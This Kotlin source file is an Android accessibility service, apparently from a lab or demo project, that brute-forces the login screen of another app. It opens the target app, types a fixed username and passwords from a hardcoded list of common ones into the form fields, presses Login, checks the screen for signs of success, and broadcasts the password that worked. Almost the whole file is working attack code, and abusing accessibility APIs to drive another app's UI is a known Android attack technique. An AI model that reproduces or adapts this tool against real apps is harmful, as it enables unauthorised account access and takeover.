package com.example.bruteforceapp

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.os.Bundle
import android.util.Log
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject

class AutoFillAccessibilityService : AccessibilityService() {

    companion object {
        var instance: AutoFillAccessibilityService? = null
        const val ACTION_START_BRUTEFORCE = "com.example.bruteforceapp.START_BRUTEFORCE"
        const val TAG = "AutoFillService"
    }

    private val serviceScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var isLoginSuccessful = false
    private var shouldStopBruteForce = false

    // Hardcoded JSON with passwords
    private val passwordsJson = """
    {
        "passwords": [
            "password123",
            "admin",
            "123456",
            "test123",
            "welcome"
        ]
    }
    """

    private val hardcodedCredentials = mapOf(
        "ip_address" to "10.0.66.31:5000",
        "username" to "test"
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d(TAG, "Accessibility service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            if (it.packageName == "com.example.loginapp") {
                Log.d(TAG, "Login app event: ${it.eventType}")

                // Check for login result changes or screen transitions
                if (it.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                    it.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    checkForLoginSuccess()
                }
            }
        }
    }

    private fun checkForLoginSuccess() {
        try {
            val rootNode = rootInActiveWindow ?: return

            // Method 1: Check for success screen with logout button
            val logoutButton = findLogoutButton(rootNode)
            if (logoutButton != null) {
                Log.d(TAG, "SUCCESS DETECTED! Found logout button - login was successful!")
                isLoginSuccessful = true
                shouldStopBruteForce = true
                return
            }

            // Method 2: Check for result text (fallback for old behavior)
//            val resultText = findLoginResultText(rootNode)
//            resultText?.let { text ->
//                Log.d(TAG, "Found result text: $text")
//
//                if (text.contains("Success", ignoreCase = true) ||
//                    text.contains("Login successful", ignoreCase = true)) {
//                    Log.d(TAG, "SUCCESS DETECTED! Login result shows success.")
//                    isLoginSuccessful = true
//                    shouldStopBruteForce = true
//                }
//            }

            // Method 3: Check if we're no longer on the login screen
            val loginButton = findNodeByText(rootNode, listOf("Login"))
            val usernameField = findAllEditableNodes(rootNode).find {
                findLabelForField(it, rootNode)?.contains("Username", ignoreCase = true) == true
            }

            // If login button and username field are gone, we might be on success screen
            if (loginButton == null && usernameField == null) {
                // Look for any indication this is a different screen
                val allText = getAllTextFromNode(rootNode).lowercase()
                if (!allText.contains("login") && !allText.contains("password") && !allText.contains("username")) {
                    Log.d(TAG, "SUCCESS DETECTED! No longer on login screen - assuming successful login.")
                    isLoginSuccessful = true
                    shouldStopBruteForce = true
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error checking login result", e)
        }
    }

    private fun findLogoutButton(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val text = node.text?.toString()?.lowercase()

        // Look for logout button
        if (text?.contains("logout") == true && node.isClickable) {
            return node
        }

        // Search children recursively
        for (i in 0 until node.childCount) {
            val result = findLogoutButton(node.getChild(i))
            if (result != null) return result
        }

        return null
    }

    private fun isOnSuccessScreen(): Boolean {
        val rootNode = rootInActiveWindow ?: return false

        // Check if we can find logout button
        val logoutButton = findLogoutButton(rootNode)
        if (logoutButton != null) return true

        // Check if login elements are gone
        val loginButton = findNodeByText(rootNode, listOf("Login"))
        val editableFields = findAllEditableNodes(rootNode)

        return loginButton == null && editableFields.isEmpty()
    }

    private fun returnToLoginScreen() {
        try {
            val rootNode = rootInActiveWindow ?: return

            // Method 1: Try to find and click logout button
            val logoutButton = findLogoutButton(rootNode)
            if (logoutButton != null) {
                Log.d(TAG, "Found logout button, clicking to return to login")
                logoutButton.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return
            }

            // Method 2: Use back button
            Log.d(TAG, "No logout button found, using back button")
            performGlobalAction(GLOBAL_ACTION_BACK)

        } catch (e: Exception) {
            Log.e(TAG, "Error returning to login screen", e)
        }
    }

    private fun getAllTextFromNode(node: AccessibilityNodeInfo): String {
        val allText = StringBuilder()

        node.text?.let { allText.append(it).append(" ") }
        node.contentDescription?.let { allText.append(it).append(" ") }

        for (i in 0 until node.childCount) {
            allText.append(getAllTextFromNode(node.getChild(i)))
        }

        return allText.toString()
    }

    private fun findLabelForField(fieldNode: AccessibilityNodeInfo, rootNode: AccessibilityNodeInfo): String? {
        // Check the field's own properties first
        fieldNode.text?.toString()?.let { if (it.isNotBlank()) return it }
        fieldNode.contentDescription?.toString()?.let { if (it.isNotBlank()) return it }
        fieldNode.hintText?.toString()?.let { if (it.isNotBlank()) return it }

        // Check parent for label
        fieldNode.parent?.let { parent ->
            findTextInNode(parent, fieldNode)?.let { return it }
        }

        return null
    }

    private fun findTextInNode(node: AccessibilityNodeInfo, excludeNode: AccessibilityNodeInfo?): String? {
        if (node == excludeNode) return null

        node.text?.toString()?.let {
            if (it.isNotBlank() && !it.equals(excludeNode?.text?.toString())) return it
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child != excludeNode) {
                findTextInNode(child, excludeNode)?.let { return it }
            }
        }

        return null
    }

    private fun findLoginResultText(node: AccessibilityNodeInfo): String? {
        val text = node.text?.toString()

        // Look for result text (usually colored text showing success/error)
        if (!text.isNullOrEmpty() &&
            (text.contains("Success", ignoreCase = true) ||
                    text.contains("Error", ignoreCase = true) ||
                    text.contains("failed", ignoreCase = true))) {
            return text
        }

        // Search children recursively
        for (i in 0 until node.childCount) {
            val result = findLoginResultText(node.getChild(i))
            if (result != null) return result
        }

        return null
    }

    override fun onInterrupt() {
        Log.d(TAG, "Service interrupted")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_START_BRUTEFORCE) {
            Log.d(TAG, "Starting brute force attack")

            // Reset flags
            isLoginSuccessful = false
            shouldStopBruteForce = false

            // Parse passwords from JSON
            val passwords = parsePasswordsFromJson()
            val ipAddress = hardcodedCredentials["ip_address"]!!
            val username = hardcodedCredentials["username"]!!

            Log.d(TAG, "Loaded ${passwords.size} passwords from JSON")

            serviceScope.launch {
                launchLoginApp()
                delay(2000) // Wait for login app to fully load

                passwords.forEachIndexed { index, password ->
                    if (shouldStopBruteForce) {
                        Log.d(TAG, "Stopping brute force - login was successful!")
                        return@launch
                    }

                    Log.d(TAG, "Attempt ${index + 1}/${passwords.size}: Trying password '$password'")
                    fillLoginForm(ipAddress, username, password)

                    // Wait and check for success before continuing
                    delay(1500) // Increased wait time for screen transition

                    if (shouldStopBruteForce) {
                        Log.d(TAG, "🎉 BREAKTHROUGH! Password '$password' cracked the system!")

                        // Broadcast the breakthrough
                        val intent = Intent("com.example.bruteforceapp.BREAKTHROUGH")
                        intent.putExtra("password", password)
                        sendBroadcast(intent)

                        return@launch
                    }

                    // Wait before next attempt (if not the last one)
                    if (index < passwords.size - 1) {
                        Log.d(TAG, "❌ Password '$password' rejected, moving to next target...")

                        // If we're on success screen, need to go back to login
                        if (isOnSuccessScreen()) {
                            Log.d(TAG, "Detected success screen, returning to login...")
                            returnToLoginScreen()
                            delay(2000) // Wait for login screen to load
                        }

                        delay(1000) // Wait before next attempt
                    }
                }

                if (!isLoginSuccessful) {
                    Log.d(TAG, "Brute force completed - no successful login found")
                }
            }
        }
        return START_NOT_STICKY
    }

    private fun parsePasswordsFromJson(): List<String> {
        return try {
            val jsonObject = JSONObject(passwordsJson)
            val passwordArray = jsonObject.getJSONArray("passwords")
            val passwords = mutableListOf<String>()

            for (i in 0 until passwordArray.length()) {
                passwords.add(passwordArray.getString(i))
            }

            passwords
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing JSON", e)
            // Fallback passwords
            listOf("password123", "admin", "123456", "test123", "welcome")
        }
    }

    private fun launchLoginApp() {
        try {
            val intent = packageManager.getLaunchIntentForPackage("com.example.loginapp")
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                startActivity(intent)
                Log.d(TAG, "Launched login app")
            } else {
                Log.e(TAG, "Login app not found")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error launching login app", e)
        }
    }

    private fun fillLoginForm(ipAddress: String, username: String, password: String) {
        val rootNode = rootInActiveWindow
        if (rootNode == null) {
            Log.e(TAG, "No active window found")
            return
        }

        Log.d(TAG, "Root node package: ${rootNode.packageName}")

        // Ensure we're in the login app
        if (rootNode.packageName != "com.example.loginapp") {
            Log.e(TAG, "Not in login app, currently in: ${rootNode.packageName}")
            return
        }

        printNodeTree(rootNode, 0) // Debug: Print entire UI tree

        try {
            // For Jetpack Compose, try different search strategies
            val allEditableNodes = findAllEditableNodes(rootNode)
            Log.d(TAG, "Found ${allEditableNodes.size} editable nodes")

            if (allEditableNodes.size >= 3) {
                // Assume order: IP, Username, Password
                Log.d(TAG, "Filling fields by order")
                fillTextField(allEditableNodes[0], ipAddress)
                Thread.sleep(300)
                fillTextField(allEditableNodes[1], username)
                Thread.sleep(300)
                fillTextField(allEditableNodes[2], password)
                Thread.sleep(300)
            } else {
                // Fallback to text-based search
                val ipField = findNodeByText(rootNode, listOf("IP Address", "ip", "server"))
                val userField = findNodeByText(rootNode, listOf("Username", "user", "email"))
                val passField = findNodeByText(rootNode, listOf("Password", "pass"))

                ipField?.let { fillTextField(it, ipAddress); Thread.sleep(300) }
                userField?.let { fillTextField(it, username); Thread.sleep(300) }
                passField?.let { fillTextField(it, password); Thread.sleep(300) }
            }

            // Find and click login button
            val loginButton = findNodeByText(rootNode, listOf("Login", "Sign In", "Submit"))
                ?: findAllClickableNodes(rootNode).find { node ->
                    node.text?.toString()?.contains("Login", ignoreCase = true) == true
                }

            loginButton?.let {
                Log.d(TAG, "Clicking login button")
                Thread.sleep(200) // Extra delay before clicking
                it.performAction(AccessibilityNodeInfo.ACTION_CLICK)

                // Dismiss keyboard after clicking login
                Thread.sleep(500) // Wait for login to process
                dismissKeyboard()
            } ?: Log.e(TAG, "Login button not found")

        } catch (e: Exception) {
            Log.e(TAG, "Error filling form", e)
        }
    }

    private fun findAllEditableNodes(node: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val editableNodes = mutableListOf<AccessibilityNodeInfo>()

        if (node.isEditable) {
            editableNodes.add(node)
        }

        for (i in 0 until node.childCount) {
            editableNodes.addAll(findAllEditableNodes(node.getChild(i)))
        }

        return editableNodes
    }

    private fun findAllClickableNodes(node: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val clickableNodes = mutableListOf<AccessibilityNodeInfo>()

        if (node.isClickable && !node.text.isNullOrEmpty()) {
            clickableNodes.add(node)
        }

        for (i in 0 until node.childCount) {
            clickableNodes.addAll(findAllClickableNodes(node.getChild(i)))
        }

        return clickableNodes
    }

    private fun dismissKeyboard() {
        try {
            Log.d(TAG, "Attempting to dismiss keyboard")
            // Method 1: Send back key
            performGlobalAction(GLOBAL_ACTION_BACK)
            Thread.sleep(300)

            // Method 2: Try to find and click outside input areas
            val rootNode = rootInActiveWindow
            rootNode?.let { root ->
                // Find a non-editable area to click
                val nonEditableNode = findNonEditableClickableArea(root)
                nonEditableNode?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }

            Log.d(TAG, "Keyboard dismissal attempted")
        } catch (e: Exception) {
            Log.e(TAG, "Error dismissing keyboard", e)
        }
    }

    private fun findNonEditableClickableArea(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        // Look for background areas or containers that can be clicked
        if (node.isClickable && !node.isEditable &&
            node.className?.contains("Layout", ignoreCase = true) == true) {
            return node
        }

        for (i in 0 until node.childCount) {
            val result = findNonEditableClickableArea(node.getChild(i))
            if (result != null) return result
        }

        return null
    }

    private fun findNodeByText(node: AccessibilityNodeInfo, searchTerms: List<String>): AccessibilityNodeInfo? {
        // Check current node
        val nodeText = node.text?.toString()?.lowercase() ?: ""
        val nodeDesc = node.contentDescription?.toString()?.lowercase() ?: ""
        val nodeHint = node.hintText?.toString()?.lowercase() ?: ""

        for (term in searchTerms) {
            if (nodeText.contains(term.lowercase()) ||
                nodeDesc.contains(term.lowercase()) ||
                nodeHint.contains(term.lowercase())) {

                // For text fields, find the editable parent/child
                if (searchTerms.contains("Password") || searchTerms.contains("Username") || searchTerms.contains("IP Address")) {
                    return findEditableNode(node) ?: findEditableNode(node.parent)
                }
                // For buttons, return the clickable node
                return if (node.isClickable) node else findClickableParent(node)
            }
        }

        // Search children recursively
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            val result = findNodeByText(child, searchTerms)
            if (result != null) return result
        }

        return null
    }

    private fun findEditableNode(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) return null

        if (node.isEditable) return node

        // Check children
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            if (child.isEditable) return child
            val result = findEditableNode(child)
            if (result != null) return result
        }

        // Check parent
        return findEditableNode(node.parent)
    }

    private fun findClickableParent(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
        if (node == null) return null
        if (node.isClickable) return node
        return findClickableParent(node.parent)
    }

    private fun fillTextField(node: AccessibilityNodeInfo, text: String) {
        try {
            // Clear existing text first
            node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION,
                Bundle().apply {
                    putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_START_INT, 0)
                    putInt(AccessibilityNodeInfo.ACTION_ARGUMENT_SELECTION_END_INT, node.text?.length ?: 0)
                })

            // Set new text
            val arguments = Bundle()
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            val result = node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)

            Log.d(TAG, "Set text '$text' result: $result")
        } catch (e: Exception) {
            Log.e(TAG, "Error setting text", e)
        }
    }

    private fun printNodeTree(node: AccessibilityNodeInfo?, depth: Int) {
        if (node == null) return

        val indent = "  ".repeat(depth)
        val text = node.text?.toString() ?: ""
        val desc = node.contentDescription?.toString() ?: ""
        val hint = node.hintText?.toString() ?: ""
        val className = node.className?.toString() ?: ""

        Log.d(TAG, "${indent}Node: class=$className, text='$text', desc='$desc', hint='$hint', editable=${node.isEditable}, clickable=${node.isClickable}")

        for (i in 0 until node.childCount) {
            printNodeTree(node.getChild(i), depth + 1)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        instance = null
    }
}